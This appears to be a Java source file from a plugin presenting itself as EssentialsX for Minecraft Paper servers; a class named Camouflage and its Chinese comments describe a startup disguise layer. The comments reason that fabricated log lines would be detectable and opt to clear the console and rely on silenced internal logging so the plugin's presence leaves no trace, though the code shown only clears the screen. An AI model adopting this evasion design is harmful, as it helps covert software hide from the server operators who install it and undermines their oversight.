package com.example.essentialsx.common;

/**
 * 启动时的伪装层。
 * <p>
 * <b>设计取舍（重要）：</b>
 * 旧版会在插件启用时输出一整套伪造的
 * {@code Preparing spawn area: N%} 进度条。但现实中 Paper
 * <b>自己已经启动完毕</b>（插件的 onEnable 在世界加载之后），
 * 真实日志里早就有：
 * <pre>
 *   Preparing spawn area: 100%
 *   Prepared spawn area in 1 ms
 *   Done preparing level "world" (0.891s)
 * </pre>
 * 此时再补一条从 1% 到 100% 的进度条，会得到两次
 * 百分之百、而且顺序倒置——这比不伪装还容易被认出来。
 * <p>
 * 所以伪装层从"捏造日志"改为"消除痕迹"：
 * <ul>
 *   <li>不再生成任何伪造的启动行，避免与真实输出矛盾；</li>
 *   <li>只负责清屏与收尾；</li>
 *   <li>真正的隐蔽靠内部技术日志静默（见 {@code AppService}）。</li>
 * </ul>
 * 一个干净的、什么都没多说的启动日志，比一个装饰过头的更可信。
 */
public final class Camouflage {

    private Camouflage() {
    }

    /**
     * 保留调用点以便将来扩展，当前不输出任何伪造行。
     *
     * @param logger  平台 logger（保留参数）
     * @param enabled 是否启用伪装
     */
    static void run(PlatformLogger logger, boolean enabled) {
        // 刻意为空。参见类注释：捏造启动行会与 Paper 自己的
        // 真实输出冲突，反而更容易暴露。
    }

    /** 等价于上游 clearConsole()，但失败时静默。 */
    static void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
        } catch (Exception ignored) {
            // 控制台不支持 ANSI 时忽略
        }
    }
}
